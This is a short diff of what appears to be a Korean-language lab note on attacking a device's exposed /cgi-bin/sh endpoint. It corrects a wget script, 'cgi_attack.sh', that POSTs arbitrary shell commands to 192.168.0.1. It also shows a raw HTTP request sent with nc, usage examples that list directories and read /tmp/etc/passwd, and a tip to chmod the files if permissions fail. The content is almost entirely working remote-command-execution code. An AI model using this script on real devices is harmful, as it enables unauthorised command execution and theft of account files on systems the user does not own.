@@ -3,8 +3,7 @@ $ cat cgi_attack.sh
 
 WGET=/usr/bin/wget
 
-$WGET -q0- --post-data="echo -e 'Content-type: text/plain\n' ; PATH=$PATH:/sbin $1 $2 $3"
-http://192.168.0.1/cgi-bin/sh
+$WGET -qO- --post-data="echo -e 'Content-type: text/plain\n' ; PATH=$PATH:/sbin $1 $2 $3" http://192.168.0.1/cgi-bin/sh
 
 $ cat cgi_attack.txt
 POST /cgi-bin/sh HTTP/1.1
@@ -20,3 +19,5 @@ $ nc -v 192.168.0.1 80 < cat_attack.txt
 2. 공격스크립트 활용
 $./cgi_attack.sh ls /tmp/etc
 $./cgi_attack.sh cat /tmp/etc/passwd
+
+#//권한오류시, chmod 755 (sh,txt)해주면 됨
